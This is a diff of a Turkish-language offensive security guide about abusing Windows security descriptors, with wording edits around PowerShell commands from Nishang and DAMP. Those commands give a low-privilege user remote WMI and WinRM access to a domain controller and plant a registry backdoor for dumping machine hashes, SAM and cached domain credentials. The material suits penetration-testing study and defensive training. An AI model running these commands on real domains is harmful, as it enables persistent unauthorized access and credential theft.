@@ -4,7 +4,7 @@
 
 ## Güvenlik Tanımlayıcıları
 
-[Belgelerden](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Güvenlik Tanımlayıcı Tanım Dili (SDDL), bir güvenlik tanımlayıcısını tanımlamak için kullanılan formatı tanımlar. SDDL, DACL ve SACL için ACE dizelerini kullanır: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
+[Belgelerden](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Güvenlik Tanımlayıcı Tanım Dili (SDDL), bir güvenlik tanımlayıcısını tanımlamak için kullanılan formatı belirler. SDDL, DACL ve SACL için ACE dizelerini kullanır: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`
 
 **Güvenlik tanımlayıcıları**, bir **nesnenin** başka bir **nesne** üzerindeki **izinlerini** **saklamak** için kullanılır. Eğer bir nesnenin **güvenlik tanımlayıcısında** sadece **küçük bir değişiklik** yapabilirseniz, o nesne üzerinde, ayrıcalıklı bir grubun üyesi olmanıza gerek kalmadan, çok ilginç ayrıcalıklar elde edebilirsiniz.
 
@@ -17,7 +17,7 @@ Bir kullanıcıya **uzaktan WMI çalıştırma** erişimi verebilirsiniz [**bunu
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
 ```
-### WinRM'e Erişim
+### WinRM Erişimi
 
 Bir kullanıcıya **winrm PS konsoluna erişim verin** [**bunu kullanarak**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
 ```bash
@@ -26,7 +26,7 @@ Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remo
 ```
 ### Hash'lara uzaktan erişim
 
-**Kayıt defterine** erişin ve **hash'leri dökün**, böylece **DAMP** kullanarak bir **Reg arka kapısı oluşturun**, böylece istediğiniz zaman **bilgisayarın hash'ini**, **SAM**'i ve bilgisayardaki herhangi bir **önbelleklenmiş AD** kimlik bilgilerini alabilirsiniz. Bu nedenle, bu izni bir **normal kullanıcıya bir Alan Denetleyici bilgisayarı üzerinde** vermek çok faydalıdır:
+**Kayıt defterine** erişin ve **hash'leri dökün**, böylece **DAMP** kullanarak bir **Reg arka kapısı oluşturun**, böylece istediğiniz zaman **bilgisayarın hash'ini**, **SAM**'i ve bilgisayardaki herhangi bir **önbelleğe alınmış AD** kimlik bilgilerini alabilirsiniz. Bu nedenle, bu izni bir **normal kullanıcıya bir Alan Denetleyici bilgisayarı üzerinde** vermek çok faydalıdır:
 ```bash
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
